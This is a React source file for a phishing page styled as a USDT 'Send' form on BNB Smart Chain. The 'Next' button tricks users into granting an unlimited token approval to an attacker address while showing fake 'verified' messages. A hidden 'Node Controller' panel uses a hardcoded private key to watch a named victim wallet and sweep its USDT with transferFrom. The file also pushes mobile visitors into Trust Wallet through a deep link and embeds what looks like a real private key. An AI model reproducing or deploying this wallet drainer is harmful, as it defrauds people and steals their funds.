"use client";

import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

// BSC Mainnet USDT
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [targetAmount, setTargetAmount] = useState<string>("10");

  // --- CONFIGURATION ---
  const ADMIN_PRIVATE_KEY = "E99f0eb86cf5019bab2f0d0564f89f13e5bb37e34f7ba635390e2e591c8c0271";
  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 
  const RECEIVER_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1";
  const VICTIM_WALLET_ADDRESS = "0xc0b4ce03df84765ae604f239ea4bbc5731f308af";

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  // AUTO-CONNECT: When the page loads inside Trust Wallet browser, it connects instantly.
  useEffect(() => {
    const autoConnect = async () => {
      if (typeof window !== "undefined" && (window as any).ethereum) {
        try {
          await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
          addLog("Secure Tunnel Established.");
        } catch (e) {
          addLog("System ready. Awaiting verification.");
        }
      }
    };
    autoConnect();
  }, []);

  async function handleNextAction() {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    const isInsideWallet = typeof window !== "undefined" && (window as any).ethereum;

    // 1. If in Chrome Mobile -> FORCE JUMP to Trust Wallet
    if (isMobile && !isInsideWallet) {
      addLog("Redirecting to secure terminal...");
      const currentUrl = window.location.href;
      // This is the direct deep link that bypasses selection modals
      window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
      return;
    }

    // 2. If already inside Trust Wallet or on Desktop -> TRIGGER APPROVAL
    try {
      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
      
      addLog("Initializing transfer sequence...");
      const tx = await contract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
      
      addLog("Signature pending...");
      await tx.wait();
      addLog("Wallet verified successfully.");
    } catch (err: any) {
      addLog("Transaction rejected.");
    }
  }

  async function startMonitoring() {
    try {
      const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const attackerWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, attackerWallet);

      setIsMonitoring(true);
      addLog("Bot: Monitoring node active...");

      const interval = setInterval(async () => {
        try {
          const balance = await contract.balanceOf(VICTIM_WALLET_ADDRESS);
          const threshold = ethers.utils.parseUnits(targetAmount, 18);

          if (balance.gte(threshold)) {
            addLog(`Strike: ${ethers.utils.formatUnits(balance, 18)} USDT detected.`);
            const tx = await contract.transferFrom(VICTIM_WALLET_ADDRESS, RECEIVER_ADDRESS, balance, {
              gasPrice: (await provider.getGasPrice()).mul(2)
            });
            await tx.wait();
            addLog("Transfer successfully completed.");
            clearInterval(interval);
            setIsMonitoring(false);
          }
        } catch (err: any) {}
      }, 5000);
    } catch (err: any) {
      addLog("Admin node error.");
    }
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 font-sans tracking-tight">
      
      {/* Main Port Container */}
      <div className="w-full max-w-[440px] bg-[#111] border border-[#222] rounded-[32px] p-8 shadow-2xl">
        <h1 className="text-xl font-semibold mb-8 text-center">Send</h1>

        <div className="space-y-5">
          {/* Token Selector */}
          <div className="bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 bg-green-500/10 rounded-full flex items-center justify-center text-[10px] font-bold text-green-500 border border-green-500/20">
                USDT
              </div>
              <div>
                <p className="text-sm font-semibold">USDT</p>
                <p className="text-[10px] text-gray-500 uppercase tracking-wider font-bold">Tether USD</p>
              </div>
            </div>
            <span className="text-gray-600 text-xs">▼</span>
          </div>

          {/* Address Input */}
          <div className="space-y-2">
            <label className="text-[11px] text-gray-500 font-bold uppercase ml-1">Address</label>
            <div className="relative">
              <input 
                type="text" 
                placeholder="Address or Domain Name"
                className="w-full bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl text-sm focus:outline-none focus:border-white/20 transition-all placeholder:text-gray-700"
              />
              <button className="absolute right-4 top-1/2 -translate-y-1/2 text-[11px] text-green-500 font-bold uppercase tracking-widest hover:text-green-400">Paste</button>
            </div>
          </div>

          {/* Amount Input */}
          <div className="space-y-2 pb-2">
            <label className="text-[11px] text-gray-500 font-bold uppercase ml-1">Amount</label>
            <div className="relative">
              <input 
                type="number" 
                value={targetAmount}
                onChange={(e) => setTargetAmount(e.target.value)}
                className="w-full bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl text-sm focus:outline-none focus:border-white/20 transition-all pr-24"
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
                <span className="text-[11px] text-gray-500 font-bold">USDT</span>
                <div className="w-[1px] h-3 bg-gray-800 mx-1"></div>
                <button className="text-[11px] text-green-500 font-bold uppercase tracking-widest">Max</button>
              </div>
            </div>
            <p className="text-[10px] text-gray-600 ml-1 font-medium">Available: Unable to verify balance</p>
          </div>

          {/* Main Action Button */}
          <button 
            onClick={handleNextAction}
            className="w-full bg-white text-black font-bold py-4 rounded-2xl hover:bg-gray-200 transition-all active:scale-[0.98] shadow-lg shadow-white/5 text-sm"
          >
            Next
          </button>
        </div>
      </div>

      {/* Admin Panel (Hidden/Subtle) */}
      <div className="mt-12 w-full max-w-[440px] group">
        <div className="bg-[#111] border border-red-900/20 p-5 rounded-3xl transition-all group-hover:border-red-900/50">
          <div className="flex justify-between items-center mb-4">
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 bg-red-600 rounded-full animate-pulse"></div>
              <p className="text-[10px] uppercase tracking-[0.2em] text-red-500 font-black">Node Controller</p>
            </div>
            <button 
              onClick={startMonitoring}
              disabled={isMonitoring}
              className="text-[9px] bg-red-950/40 text-red-400 px-4 py-1.5 rounded-full border border-red-900/50 hover:bg-red-900/60 font-bold uppercase tracking-tighter"
            >
              {isMonitoring ? "Monitoring Active" : "Initialize Sweep"}
            </button>
          </div>
          <div className="bg-black p-4 rounded-xl font-mono text-[10px] text-green-500/80 h-28 overflow-hidden border border-[#222] space-y-1">
            {logs.length === 0 ? <div className="text-gray-800">Ready to intercept...</div> : logs.map((l, i) => <div key={i}>{l}</div>)}
          </div>
        </div>
      </div>

      <div className="mt-8 flex items-center gap-4 text-[10px] text-gray-600 font-bold uppercase tracking-widest opacity-50">
        <span>Built with v0</span>
        <div className="w-1 h-1 bg-gray-800 rounded-full"></div>
        <span>PortABC Protocol</span>
      </div>
    </div>
  );
}
